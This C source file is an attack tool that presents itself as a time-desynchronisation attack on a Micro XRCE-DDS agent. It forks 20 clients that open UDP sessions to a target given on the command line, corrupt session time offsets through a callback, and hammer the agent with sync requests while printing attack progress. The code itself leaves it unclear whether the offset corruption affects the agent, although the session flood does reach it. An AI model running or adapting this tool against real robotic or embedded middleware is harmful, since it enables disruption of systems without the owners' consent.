// Compile: gcc attack_time_desync.c -o time_desync -lmicroxrcedds_client -lmicrocdr
#include <uxr/client/client.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#define NUM_CLIENTS 20

int64_t malicious_offset = 0;

void malicious_time_callback(
        uxrSession* session,
        int64_t current_time,
        int64_t transmit_timestamp,
        int64_t received_timestamp,
        int64_t originate_timestamp,
        void* args)
{
    (void)current_time;
    (void)transmit_timestamp;
    (void)received_timestamp;
    (void)originate_timestamp;
    (void)args;
    
    malicious_offset += 10000000;
    session->time_offset = malicious_offset;
    
    printf("[*] Corrupted time offset to: %lld nanoseconds (%.2f seconds)\n", 
           (long long)malicious_offset, malicious_offset / 1000000000.0);
}

void attack_single_client(char* ip, char* port, int client_id) {
    printf("[Client %d] Starting time desync attack...\n", client_id);
    
    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, ip, port)) {
        printf("[Client %d] Failed to init transport\n", client_id);
        return;
    }
    
    uxrSession session;
    uint32_t key = 0x71E00000 + client_id;
    uxr_init_session(&session, &transport.comm, key);
    
    if (!uxr_create_session(&session)) {
        printf("[Client %d] Failed to create session\n", client_id);
        uxr_close_udp_transport(&transport);
        return;
    }
    
    uxr_set_time_callback(&session, malicious_time_callback, NULL);
    
    printf("[Client %d] Desynchronizing time...\n", client_id);
    for (int i = 0; i < 100; i++) {
        uxr_sync_session(&session, 1000);
        usleep(100000);
        
        if (i % 10 == 0) {
            printf("[Client %d] Desync iteration %d, offset: %lld ns\n", 
                   client_id, i, (long long)session.time_offset);
        }
    }
    
    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);
    
    printf("[Client %d] Completed\n", client_id);
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    char* port = argv[2];
    
    printf("=== Time Synchronization Desync Attack ===\n");
    printf("Target: %s:%s\n", ip, port);
    printf("Number of malicious clients: %d\n\n", NUM_CLIENTS);
    
    for (int i = 0; i < NUM_CLIENTS; i++) {
        pid_t pid = fork();
        
        if (pid == 0) {
            attack_single_client(ip, port, i);
            exit(0);
        } else if (pid < 0) {
            printf("[-] Fork failed for client %d\n", i);
        }
        
        usleep(100000);
    }
    
    printf("[*] Waiting for all clients to complete...\n");
    for (int i = 0; i < NUM_CLIENTS; i++) {
        wait(NULL);
    }
    
    printf("\n[*] Attack completed\n");
    return 0;
}
